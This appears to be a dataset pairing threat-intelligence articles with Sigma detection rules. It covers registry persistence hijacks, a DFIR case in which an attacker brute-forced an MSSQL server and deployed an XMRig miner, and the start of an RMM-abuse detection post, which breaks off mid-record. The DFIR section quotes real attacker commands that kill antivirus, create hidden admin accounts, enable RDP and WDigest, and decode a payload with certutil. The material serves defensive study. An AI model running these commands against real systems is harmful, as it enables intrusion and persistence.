[HKEY_CLASSES_ROOT\\CLSID\\{834128A2-51F4-11D0-8F20-00805F2CD064}\\LocalServer32]\n  @=PATH\n  ```\n\n### Registering itself as a Script Debugger\n\nThe Windows Script Debugger (WSD) is a standalone tool that one can use to actively debug their scripts (e.g. vbs). Once installed, a developer can run one of the following commands:\n\n- `cscript /x script.vbs`\n\nor\n\n- `wscript /x script.vbs`\n\nto debug the script.\n\nThe name of the executable that is used as a debugger is stored inside the following key:\n\n```\n[HKEY_CLASSES_ROOT\\CLSID\\{834128A2-51F4-11D0-8F20-00805F2CD064}\\LocalServer32]\n```\n\nand on a system where the WSD is installed may look like this:\n\n```\n[HKEY_CLASSES_ROOT\\CLSID\\{834128A2-51F4-11D0-8F20-00805F2CD064}\\LocalServer32]\n@=\"C:\\\\Program Files\\\\Microsoft Script Debugger\\\\msscrdbg.exe\"\n```\n\nOne could replace the script debugger path to lead its own executable anytime the debugger is launched and this way making it kinda persistent on the system. Kinda, as the .exe will be executed only on rare occasion when the debugger is actually being installed (developer’s or power user’s machine).\n\nOther issue is that the launching of the script debugger takes more steps than just looking up the value in the registry and launching the appropriate application.\n\nWhen VBScript tries to find the debugger it talks to few COM components first (e.g. Process Debug Manager) so in order to make it work, one would need to also register these COM components (if you want to know more details, install WSD and see registry changes associated with the installation).\n\n### Hijacking Process Debug Manager\n\nThe alternative persistence mechanism could hijack one of these COM components that VBScript ‘talks to’ and replace its server path to point to a malicious file. The DLL does not even need to implement any COM functionality and it’s enough for it to be a simple, loadable library. The Process Debug Manager that I mentioned earlier could do the trick here. Its CLSID’s value on a system where WSD is installed is shown below:\n\n```\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{78A51822-51F4-11D0-8F20-00805F2CD064}\\InprocServer32]\n@=\"C:\\\\WINDOWS\\\\system32\\\\pdm.dll\"\n```\n\nPointing InprocServer32 to a malicious DLL would load anytime VBScript (or any other module) is ‘consulting’ ProcessDebugManager.\n\n### ServiceDll Hijack\n\nMany entries under\n\n```\n[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services]\n```\n\ncan be hijacked by swapping their ServiceDll parameter to point to a malicious entry. e.g. the Remote Access Service registry entry\n\n```\n[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\RemoteAccess\\Parameters]\n```\n\nnormally points to\n\n```\n%SystemRoot%\\System32\\mprdim.dll\n```\n\nbut it can be changed to point to a malicious component. There are many default services that could be hijacked this way.\n\n### Mapi32 Stub Library\n\nOlder versions of Outlook 2007 allowed to add extra functionality to Outlook by means of installing a custom version of mapi32.dll in the system directory as explained in this article.\n\nThe relevant Mapi32.dll Stub Registry Settings are provided in the Registry in the following location:\n\n```\n[HKEY_LOCAL_MACHINE\\Software\\Clients\\Mail::(default)]\n```\n\n- `DLLPath`\n  - Full path to the Simple MAPI provider DLL.\n\n- `DLLPathEx`\n  - Full path to the MAPI provider DLL. Provider DLLs that support both Simple MAPI and MAPI must have both keys set.\n\nObviously, this mechanism is a perfect target for abuse.\n\n### Hijacking Client executables\n\nThe Registering Programs with Client Types article from Microsoft explains on ‘how to register a program in the Windows registry as one of the following client types: browser, email, media playback, instant messaging, or virtual machine for Java.’. Looking at the registry entries associated with these registration we can find the following key:\n\n```\n[HKEY_LOCAL_MACHINE\\Software\\Clients\\]\n```\n\nMany applications listed under this key can be hijacked e.g. Mail program contain keys that point to executables:\n\n```\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Clients\\Mail\\Windows Mail\\InstallInfo]\n```\n\n- `HideIconsCommand`\n- `ReinstallCommand`\n- `ShowIconsCommand`\n\n### Windows 2000 Welcome\n\nInstallation of Windows 2000 always ends up with the “Getting Started with Windows 2000” window shown on the screen after the system restarts. User has an option to disable it, but the box is ticked ON by default.\n\nThe window shows up as a result of welcome.exe being executed from the following location:\n\n```\nC:\\WINNT\\Welcome.exe\n```\n\nThe flag that determines whether the welcome.exe is executed or not is stored in the following Registry location:\n\n```\n[HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\tips\\Show: 0x00000001]\n```\n\nReplacing *welcome.exe* and ensuring the value of *Show* is equal to 1 will make the *C:\\WINNT\\Welcome.exe* execute every time system starts.\n\nWell, not quite.\n\nIf the file is replaced, it will be ‘magically’ restored from the following location:\n\n```\nc:\\WINNT\\system32\\dllcache\\welcome.exe\n```\n\nSo, the malware needs to be copied into 2 locations, and… the Windows File Protection needs to be disabled as well\n\nSee you in the Part 5.",
    "sigma_rule": {
      "title": "Potential Registry Persistence Attempt Via DbgManagedDebugger",
      "id": "9827ae57-3802-418f-994b-d5ecf5cd974b",
      "status": "test",
      "description": "Detects the addition of the \"Debugger\" value to the \"DbgManagedDebugger\" key in order to achieve persistence. Which will get invoked when an application crashes",
      "references": [
        "https://www.hexacorn.com/blog/2013/09/19/beyond-good-ol-run-key-part-4/",
        "https://github.com/last-byte/PersistenceSniper"
      ],
      "author": "frack113",
      "date": "2022-08-07",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence",
        "attack.t1574"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Microsoft\\.NETFramework\\DbgManagedDebugger"
        },
        "filter": {
          "Details": "\"C:\\Windows\\system32\\vsjitdebugger.exe\" PID %d APPDOM %d EXTEXT \"%s\" EVTHDL %d"
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Legitimate use of the key to setup a debugger. Which is often the case on developers machines"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_dbgmanageddebugger_persistence.yml"
  },
  "35": {
    "url": "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
    "markdown": "# SELECT XMRig FROM SQLServer\n\n**Categories:** coinminer, exploit \n**Published Date:** July 11, 2022 \n\n---\n\nIn March 2022, we observed an intrusion on a public-facing Microsoft SQL Server. The end goal of this intrusion was to deploy a coin miner. Although deploying a coin miner on a vulnerable server after successful exploitation is a common objective for threat actors, this intrusion was slightly different and therefore more interesting.\n\nUS CERT recently published a malware analysis report related to XMRig coin miner on 23rd June 2022 (link) and a security tip for defending against this threat (link).\n\n---\n\n## Summary\n\nOver the month of March, we observed a cluster of activity targeting MSSQL servers. The activity started via password brute force attempts for the MSSQL SA account. These brute force attempts were observed repeatedly over the month. Examples included one cluster of 24,000 failed attempts from the same source, over a 27-hour effort, before they finally managed to guess the password. After obtaining the correct credentials, the attackers spawned a command shell via `xp_cmdshell`. According to Microsoft documentation, `xp_cmdshell` spawns a Windows command shell and passes in a string for execution.\n\nUsing `xp_cmdshell`, the threat actors were able to execute any command against the compromised server. They attempted to kill a bunch of AV programs by using `taskkill.exe`. The threat actors then wrote multiple commands to a batch file by using `echo` and redirecting the strings to a file named `1.bat`. After the batch file was written, they proceeded to perform the same action echoing data into a file named `bigfile.txt`. After finishing writing to that file, they ran `certutil` to decode the base64 data into an executable file. This executable was a privilege escalation tool used to execute the batch file to ensure it executed with high enough permissions. They then executed the batch script. The commands included adding new users to the local administrators group, enabling RDP, enabling WDigest, and hiding the newly created admin accounts using the registry.\n\nOnce the threat actors had established persistence on the compromised host, they moved to their final objective, which was to install and run the XMRig miner. They dropped a Binary Managed Object Format (BMOF) file along with the miner itself to achieve this. The threat actors used `mofcomp.exe` to decompile the BMOF binary and register a malicious class in the WMI repository. The event consumer of the newly created classes included a VBE script responsible for setting up and executing the XMRig miner with the correct settings.\n\nNo other activity beyond the mining was observed before the threat actors were evicted.\n\n---\n\n## Services\n\nWe offer multiple services, including a Threat Feed service that tracks Command and Control frameworks such as Cobalt Strike, Sliver, BumbleBee, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here.\n\nArtifacts for this case are limited due to the environment. A few log sources are available for this case under our Security Researcher and Organization services.\n\n---\n\n## Initial Access\n\nThe initial access took place via a brute-force attack, where the threat actors mainly targeted the System Admin (SA) account.\n\nDuring the intrusions, we could see SQL Server event ID **18456** Failure Audit Events in the Windows application logs. We witnessed more than 24,000 attempts from the same source before the threat actors successfully guessed the username and password for the open SQL database.\n\n### Example of the failed brute force attempts:\n\n```image\nAlt: Failed Attempts\nDescription: The image displays a series of failed login attempts to a SQL Server, showing usernames and the corresponding reasons for failure. Each entry indicates whether the password did not match or the login could not be found. The usernames include common administrative names like 'sa' and 'admin,' highlighting potential brute force attack attempts.\nTranscription: |\n  sa | Reason: Password did not match that for the login provided. |\n  hbv7 | Reason: Could not find a login matching the name provided. |\n  su | Reason: Could not find a login matching the name provided. |\n  ps | Reason: Could not find a login matching the name provided. |\n  vice | Reason: Could not find a login matching the name provided. |\n  kisadmin | Reason: Could not find a login matching the name provided. |\n  401hk | Reason: Could not find a login matching the name provided. |\n  sysdba | Reason: Could not find a login matching the name provided. |\n  admin | Reason: Password did not match that for the login provided. |\n  uep | Reason: Could not find a login matching the name provided. |\n  bizbox | Reason: Could not find a login matching the name provided. |\n  neterp | Reason: Could not find a login matching the name provided. |\n  unierp | Reason: Could not find a login matching the name provided. |\n  sp | Reason: Could not find a login matching the name provided. |\n  root | Reason: Password did not match that for the login provided. |\n  bwsa | Reason: Could not find a login matching the name provided. |\n```\n\n### Followed by eventual successful logins:\n\n```image\nAlt: Successful Logins\nDescription: The image depicts a table displaying SQL Server audit events. It includes columns such as 'TimeWritten,' 'EventID,' 'EventTypeName,' 'EventCategory,' 'SourceName,' and 'Strings,' showing multiple entries for successful audit events. The entries indicate the timestamps of the events, the event type as 'Success Audit event,' and the source name as 'MSSQL$SQLEXPRESS,' suggesting automated access attempts by the threat actor.\nTranscription: |\n  | TimeWritten      | EventID | EventT | EventTypeName       | EventC | SourceName       | Strings       |\n  | ---------------- | ------- | ------ | ------------------- | ------ | ---------------- | ------------- |\n  | 2022-11-01 11:00 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n  | 2022-11-01 11:00 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n  | 2022-11-01 11:01 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n```\n\nIt is likely that multiple successful logins were observed due to the automated access script that the threat actor was using.\n\n---\n\n## Execution\n\nIn the next attack stage, the threat actors established a cmd shell via Extended SQL Stored Procedure (`xp_cmdshell`). This process allows you to issue operating system commands directly to the Windows command shell using T-SQL code.\n\n### Example of command execution following a successful authentication to SQL database using `xp_cmdshell`:\n\n```\nEXEC xp_cmdshell 'whoami'\n```\n\nAt a high level, the overall execution events can be depicted in the below diagram:\n\n```image\nAlt: Execution Diagram\nDescription: The image is a flow diagram illustrating the execution events following a successful brute-force attack against a SQL Server. It details the steps from authentication via brute force, the use of the command shell via `xp_cmdshell`, writing various scripts and files to disk, compiling a MOF file, and killing antivirus processes. The diagram includes visual elements like boxes and arrows showing the progression of actions taken by threat actors, such as adding local administrator accounts and setting up a scheduled task for running XMRig CoinMiner.\nTranscription: |\n  START\n    Brute-Force Attack Against SQL Server\n      Successful Authentication via Brute Force Attack\n        Command Shell via xp_cmdshell\n          Writes 1.bat, and bigfile.txt to disk\n            decodes bigfile.txt with certutil into bigfile.exe\n              bigfile.exe used to run 1.bat\n                1.bat performs the following\n                  Adding Local Administrator Accounts\n                  Hiding New Local Admin Accounts\n                  Enables RDP\n                  Enables Widget\n          Writes kit.bat to disk\n            Running XMRig CoinMiner\n              Creating scheduled task for CoinMiner\n      Compiling BMOF file\n        Adding a new class/ MyASEventConsumer in WMI repository\n          EventConsumer (Script or executable to run)\n            Creates persistence\n            Download/executes VBE script\n              - Random Name\n              - Executes every day at 23:00\n          EventFilter (Trigger condition)\n          Binding (Tie together Filter + Consumer)\n    Kills AV Processes\n```\n\nIf we look into the Windows Application logs, specifically, the SQL Server event ID 15457 captures this as an `xp_cmdshell` event. Additionally, the SQL Server audit collection also captures similar events. The first commands executed by the threat actors included using `taskkill` for various anti-virus software.\n\n### Commands to kill AV processes:\n\n```\ntaskkill /f /im egui.exe\ntaskkill /f /im QQPCTray.exe\ntaskkill /f /im SafeDogGuardCenter.exe\ntaskkill /f /im 360safe.exe\ntaskkill /f /im net1895.exe\ntaskkill /f /im ekrn.exe\ntaskkill /f /im 360rp.exe\ntaskkill /f /im QQPCMgr.exe\ntaskkill /f /im SafeDogServerUI.exe\ntaskkill /f /im SafeDogSiteIIS.exe\n```\n\nThe threat actors also favored the execution of batch scripts on the compromised host. They used `xp_cmdshell` to write a batch script (`1.bat`) to disk by redirecting strings to the file using `echo` commands.\n\n```image\nAlt: Batch Script Creation\nDescription: The image displays a table detailing a process execution log from a cybersecurity incident. It includes columns for 'Initiating Process File Name', 'Action Type', 'Initiating Process Command Line', 'Initiating Process Account Name', and 'File Name'. The table shows that 'cmd.exe' initiated a file creation action, specifically creating a batch file named '1.bat'. The command line executed involves various administrative commands, such as adding a user to local groups and modifying registry entries.\nTranscription: |\n  | Initiating Process File Name | Action Type | Initiating Process Command Line| Initiating Process Account Name | File Name |\n  | ---------------------------- | ----------- || ------------------------------- | --------- |\n  | cmd.exe                      | FileCreated | \"cmd.exe\" /c (echo NET USER Admin\\$ !67hC5140Rvg /ADD /expires:never & echo NET LOCALGROUP Administrators /ADD Admin\\$ & REG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v SpecialAccounts\\Userlist /t REG_DWORD /d 0 & echo reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\" /v UseLogonCredential /t REG_DWORD /d 1 /f & echo reg add \"HKLM\\LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v UserAuthentication /t REG_DWORD /d 0 /f & echo reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-TCP\" /v UserAuthentication /t REG_DWORD /d 0 /f & echo NET LOCALGROUP Administrators /ADD Admin\\$ & echo NET LOCALGROUP Administrators /ADD Admin\\$ > %USERPROFILE%\\AppData\\1.bat | mssql$sqlexpress                | 1.bat     |\n```\n\nA second set of commands was also echoed into a file named `bigfile.txt`. Once complete, `certutil` was used to decode the text and create an executable file.\n\n### Certutil command:\n\n```\ncmd.exe /c certutil -decode %USERPROFILE%\\AppData\\bigfile.txt %USERPROFILE%\\AppData\\bigfile.exe\n```\n\nThis executable was then used in executing the `1.bat` batch file.\n\n### Command to execute batch file:\n\n```\ncmd.exe /c %USERPROFILE%\\AppData\\bigfile.exe -i -c %USERPROFILE%\\AppData\\1.bat\n```\n\nPulling the hash of the file that was written matches what appears to be a privilege escalation tool as seen in the hits from THOR scanner: \nhttps://www.virustotal.com/gui/file/b67dfd4a818d10a017a4d32386cf4cd2a3974636bed04f27e45de6ada86a56d2/community\n\n```image\nAlt: THOR Scanner\nDescription: The image displays a screenshot from the THOR APT Scanner, detailing YARA signature matches for various hacking tools and indicators. It includes specific rules like 'Hacktool_Inject_Incognito' and 'Hacktool_Privilege_Escalation_Jan22_1,' with links to their descriptions and detection information. Detection timestamps and AV detection rates (e.g., 8/67) are also provided, indicating the effectiveness of the rules in identifying malicious activity.\nTranscription: |\n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: Hacktool_Inject_Incognito\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/Hacktool_Inject_Incognito\n  DESCRIPTION: Detects hacktool incognito\n  RULE_AUTHOR: Florian Roth\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 6 / 67\n  \n  Use these tags to search for similar matches: #hacktool #incognito #hacktool_inject_incognito\n  More information: https://www.nextron-systems.com/notes-on-virustotal-matches/\n  \n  ---\n  \n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: Hacktool_Incognito_av\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/Hacktool_Incognito_av\n  DESCRIPTION: Detects Hacktool Incognito Av\n  REFERENCE: https://www.virustotal.com/en/file/18e64d4c240f6481e7bd542f6c8acc802549d437ec0018e10a3b0b6f675d/analysis/\n  RULE_AUTHOR: Florian Roth\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 8 / 67\n  \n  Use these tags to search for similar matches: #hacktool #incognito #hacktool_incognito_av\n  More information: https://www.nextron-systems.com/notes-on-virustotal-matches/\n  \n  ---\n  \n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: HKTK_Inject_Privilege_Escalation_Jan22_1\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/HKTK_Inject_Privilege_Escalation_Jan22_1\n  DESCRIPTION: Detects a hacktool that seems to provide privilege escalation vectors\n  RULE_AUTHOR: Florian Roth\n  \n  👋 Hey, this seems to be an open-source tool or framework. The author has shared it with the community with the intention to improve overall security. If you are a victim and noticed this tool in a breach, please visit the tool's github page (see above) and tell your story by creating an issue on the issues page: https://github.com/KaLendis/CVE-2022-21882/issues ❤️.\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 6 / 67\n```\n\nWe believe this tool may be a variation of NetworkServiceExploit.exe, which attempts to use NetworkService for privilege escalation.\n\n---\n\n## Persistence\n\nThe threat actors wrote a batch script (`1.bat`) that contained commands for establishing persistence on the compromised host. We see the creation of a new account and adding this account to the local administrators group.\n\n### Commands to create and add user:\n```\nNET USER Adminv$ !67hCS14ORVg /ADD /expires:never\nNET LOCALGROUP Administrators /ADD Adminv$\n```\n\nThey also made remote RDP connections possible by changing the `fDenyTSConnections` and `UserAuthentication` values to `0`.\n\n### Commands to enable RDP:\n```\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-TCP\" /v UserAuthentication /t REG_DWORD /d \"0\" /f\n```\n\nThe full contents of `1.bat` also included commands to hide the user account by adding it to the registry using \"Special Accounts\".\n\n### Command to hide user account:\n```\nREG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v Adminv$ /t REG_DWORD /d 0\n```\n\n---\n\n## Credential Access\n\nDuring the initial access, credentials were obtained via a brute-force attack against the exposed MSSQL server. No other credential access was observed during this intrusion, although the threat actors did enable WDigest to make later credential access easier.\n\n---\n\n## Command and Control\n\nWe observed that the domain `mymst007[.]info` is used to download further payloads. The domain was created five years ago. We have seen similar reports that make mention of the same infrastructure. Attacks associated with this domain include the same or similar tactics techniques and procedures (TTPs).\n\n```image\nAlt: Connections\nDescription: The image is a detailed diagram illustrating the connections and communications related to the domain 'mymst007.info'. It includes nodes representing contacted IPs, domains, downloaded files, and URLs, along with specific filenames such as 'CSRSS.exe' and 'weixin.html'. The diagram visually maps out the relationships and interactions between these elements, highlighting the command and control infrastructure associated with the observed cyber attacks.\nTranscription: |\n  - Resolutions\n    - mst.mymst007.info\n    - mst2.mymst007.info\n  - Siblings\n  - Contacted ips\n  - Contacted domains\n  - Communicating files\n  - Downloaded files\n    - weixin.html\n  - Referrer files\n    - 3f14dc75982f1abd67e66623c5c8277b8d109be96b6f8fef92e4c0be7b2c9b1\n    - wrmi-instance-script.txt (1e4fdd4670ddb98286ed18bb3940c812215b2e5bda0886589e397667000391f)\n    - 563d381d5f8c7fecc6bd8e228cdf8beccab81fe5b1cfb29ddc34dc779e70e1\n    - 1c496854a393f70196745be19e47d758d50df22e2ed3c247a2008576105f\n  - Contacted urls\n    - http://mst2.mymst007.info/\n    - http://mst2.mymst007.info:4000/ver\n    - http://mst.mymst007.info/\n    - http://mst.mymst007.info:8080/all.dll.asp\n    - http://mst.mymst007.info/perp2017/home2/pergavr2017/a.exe\n  - CSRSS.exe\n```\n\n---\n\n## Impact\n\nThe impact was concentrated on this one host. We did not see any further activity in this case. The compromised host had XMRig miner installed and running. The miner was also connecting to cryptomining pools such as `minergate[.]com`.\n\n---\n\n## Indicators\n\n### File\n\n```\nWinRing0x64.sys\n0c0195c48b6b8582fa6f6373032118da\nd25340ae8e92a6d29f599fef426a2bc1b5217299\n11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5\n\nex.exe\na7bafac5ed29a68e0fff6eecc3f5bb3f\n4f19b6970e35b3d20f84a91e3af0d82c68096710\n428d06c889b17d5f95f9df952fc13b1cdd8ef520c51e2abff2f9192aa78a4b24\n\nkit.bat\n91931a2b1ae645004023e1b35fe57314\n9f5a7a293c92ef42374cf1471b653ed994446c15\n4905b7776810dc60e710af96a7e54420aaa15467ef5909b260d9a9bc46911186\n\nsmss.exe\ne579cd176b384b38eda6a0c61c51c274\n8a3b31ac12d9ac1a44707b1de75b8870189db83a\nd3c3f529a09203a839b41cd461cc561494b432d810041d71d41a66ee7d285d69\n\nxit\n88fba011db6e5122f4aa2c0343e11275\na2d34aeee2fb7c1ba57a11c03cc33e76f1217548\ncfa12bb31d58d30875b7a20ed05b5c100032b6a18802fbdf3913e70288e11a55\n\nxitmf\n0c8622c4871541e89d0173d5be0db8aa\nb01a88df39857417233d9bd3256f82d0fdcc63f8\nbeda317d74b8f1090e251205064e686d330a0502006a54dc94d528d6bd16c416\n```\n\n### Network\n\n```\nminergate[.]com\nmymst007[.]info\nbj87670@gmail.com\n```\n\n---\n\n## Detections\n\n### Sigma Rules\n\n- Suspicious Commands by SQL Server\n- MOFComp Execution\n- Hiding Local User Accounts\n\n### Yara Rules\n\n```\nrule miner_batch {\n   meta:\n      description = \"file kit.bat\"\n      author = \"TheDFIRReport\"\n      reference = \"https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\"\n      date = \"2022/07/10\"\n      hash1 = \"4905b7776810dc60e710af96a7e54420aaa15467ef5909b260d9a9bc46911186\"\n   strings:\n      $a1 = \"%~dps0\" fullword ascii\n      $a2 = \"set app\" fullword ascii\n      $a3 = \"cd /d \\\"%~dps0\\\"\" fullword ascii\n      $a4 = \"set usr=jood\" fullword ascii\n      $s1 = \"schtasks /run\" fullword ascii\n      $s2 = \"schtasks /delete\" fullword ascii\n      $a5 = \"if \\\"%1\\\"==\\\"-s\\\" (\" fullword ascii\n   condition:\n      uint16(0) == 0xfeff and filesize < 1KB and\n      3 of ($a*) and 1 of ($s*)\n}\n```\n\n---\n\n## MITRE Techniques\n\n```\nT1053.005 - Scheduled Task/Job: Scheduled Task\nT1136.001 - Create Account: Local Account\nT1546.003 - Event Triggered Execution: Windows Management Instrumentation Event Subscription\nT1564.002 - Hide Artifacts: Hidden Users\nT1059.003 - Command and Scripting Interpreter: Windows Command Shell\nT1027.004 - Obfuscated Files or Information: Compile After Delivery\nT1110.001 - Brute Force: Password Guessing\nT1070.004 - Indicator Removal on Host: File Deletion\nT1562.001 – Impair Defenses: Disable or Modify Tools\nT1546.012 - Event Triggered Execution: Image File Execution Options Injection\nT1140 - Deobfuscate/Decode Files or Information\nT1112 - Modify Registry\nT1078 - Valid Accounts\nT1134.001 - Token Impersonation/Theft\n```",
    "sigma_rule": {
      "title": "Potential Suspicious Mofcomp Execution",
      "id": "1dd05363-104e-4b4a-b963-196a534b03a1",
      "status": "test",
      "description": "Detects execution of the \"mofcomp\" utility as a child of a suspicious shell or script running utility or by having a suspicious path in the commandline.\nThe \"mofcomp\" utility parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository.\nAttackers abuse this utility to install malicious MOF scripts\n",
      "references": [
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
        "https://github.com/The-DFIR-Report/Sigma-Rules/blob/75260568a7ffe61b2458ca05f6f25914efb44337/win_mofcomp_execution.yml",
        "https://learn.microsoft.com/en-us/windows/win32/wmisdk/mofcomp"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-12",
      "modified": "2023-04-11",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\mofcomp.exe"
          },
          {
            "OriginalFileName": "mofcomp.exe"
          }
        ],
        "selection_case": [
          {
            "ParentImage|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\pwsh.exe",
              "\\wsl.exe",
              "\\wscript.exe",
              "\\cscript.exe"
            ]
          },
          {
            "CommandLine|contains": [
              "\\AppData\\Local\\Temp",
              "\\Users\\Public\\",
              "\\WINDOWS\\Temp\\",
              "%temp%",
              "%tmp%",
              "%appdata%"
            ]
          }
        ],
        "filter_main_wmiprvse": {
          "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
          "CommandLine|contains": "C:\\Windows\\TEMP\\",
          "CommandLine|endswith": ".mof"
        },
        "filter_optional_null_parent": {
          "CommandLine|contains": "C:\\Windows\\TEMP\\",
          "CommandLine|endswith": ".mof"
        },
        "condition": "all of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_mofcomp_execution.yml"
  },
  "36": {
    "url": "https://redcanary.com/blog/threat-detection/misbehaving-rats/",
    "markdown": "# Remote access tool or trojan? How to detect misbehaving RATs\n\nThe only difference between a remote administration tool and a remote access trojan (RAT) is who’s controlling it.\n\nOriginally published: August 19, 2021. Last modified: October 1, 2024.\n\n---\n\nRed Canary’s Cyber Incident Response Team frequently observes adversaries abusing legitimate remote access utilities for lateral movement and execution of payloads. These tools perform reliably, as you may expect with most enterprise software, and allow operators to pivot and transfer data to and from victim machines.\n\nAdversarial abuse of remote monitoring & management (RMM) software is not new, but—given the rash of costly and destructive ransomware attacks in recent months and years—it’s particularly important that security teams develop robust security controls for detecting malicious use of RMM tooling. In fact, just last week AdvIntel reported on adversaries who—after gaining initial access—had installed an RMM tool called Atera and used it as a functional backdoor in the lead up to a Conti ransomware outbreak.\n\nSimilar to how we detailed the various exfiltration tools used by adversaries during ransomware extortion, in this post we’ll discuss why it’s important to monitor RMM software in your enterprise, and we’ll offer detailed guidance on how to observe and detect it.\n\n## RAT v. RAT\n\nOnce an adversary gets their hands on it, a *remote administration tool* can become a *remote access trojan*. The primary difference between a “trojan” and a “tool” is whether or not your organization still has control over the software, but determining that can be tricky. With each of these tools, you’ll need to “know normal,” as SANS says, and ask behavioral questions of each tool. Start with simple questions like:\n\n- Which directory does it normally execute from?\n- Where does it normally establish connections to?\n- What do these tools typically write to the filesystem?\n- Should I expect child processes?\n- Is this software approved in my environment?\n\nThe goal of this admittedly non-comprehensive list of questions is to detect abnormalities in your telemetry. Basically, you will take a baseline of the application’s behavior and apply best efforts to writing detection logic on commonly observed techniques that adversaries employ. Detection engineers want to cut through the noise as much as possible and find anomalies in vast data sets. On top of this, each tool’s execution behaviors vary, which makes answering the questions above a time-consuming process for analysts.\n\n## NetSupport\n\nIn the case of one remote administration tool, known as “NetSupport,” malicious usage can usually be distinguished by a few factors:\n\n- connections to malicious domains\n- renaming the primary NetSupport binary, `client32`, to something else\n- executing from directories outside of the usual “program files” folder\n\nIn the below instance, we would qualify the copy of NetSupport as “suspect” based on the directory and process name.\n\n*Note: `ctfmon.exe` is a renamed version of NetSupport binary.*\n\n```image\nAlt: remote access trojan detection\nDescription: The image displays a detailed analysis of a process spawned by 'powershell.exe' on a Windows system. It shows the command line used to execute 'ctfmon.exe', which is identified as a renamed version of the NetSupport binary. Additionally, it indicates an outbound TCP network connection to 'geo.netsupportsoftware.com', including its IP address and port. There is a note emphasizing that the network connections to 'netsupportsoftware.com' suggest the presence of the NetSupport Manager RAT, potentially indicating malicious activity.\nTranscription: |\n  Process spawned by powershell.exe\n  c:\\users\\[REDACTED]\\appdata\\roaming\\6bgh4ls\\ctfmon.exe 252dce576f9fbb9aaa7114dd7150f320 b6b51f4273420c24ea7dc13ef4cc7615262ccbd6f6f5e5a49dae604ec153055ad\n  \n  Command Line: \"C:\\Users\\[REDACTED]\\AppData\\Roaming\\6bgh4ls\\ctfmon.exe\"\n  \n  Outbound tcp network connection by ctfmon.exe to\n  geo.netsupportsoftware[.]com (195.171.92[.]116:80)\n  \n  Network connections to netsupportsoftware.com indicate the presence of the NetSupport Manager RAT. This tool may be injected into other software during execution.\n```\n\nAdversaries frequently rename binaries, as shown above, in an effort to evade overly specific detections. However, these binaries often depend on dynamic link libraries (DLL) that cannot be renamed, which make for useful indicators of the tool being abused. Analysts can search for the utility in question on a site like VirusTotal to get a list of associated DLLs the utility loads at run time, and these module loads may be reliable indicators that the utility is being used, even if it has been renamed and is running from an unusual path.\n\nIn this example, `ctfmon.exe` is the renamed `client32` NetSupport binary, which you can see by the hashes of the two binaries.\n\n```image\nAlt: Renamed NetSupport Utility\nDescription: The image displays a technical log showing the file paths and associated hashes of two executables: `client32.exe` and `ctfmon.exe`. Both files are located in the `appdata\\roaming` of a user, indicating potential misbehavior linked to the NetSupport remote access tool. The hashes for both files suggest they are identical, highlighting that `ctfmon.exe` is a renamed copy of `client32.exe`, which is a common tactic used by adversaries to evade detection.\nTranscription: |\n  File last wrote\n  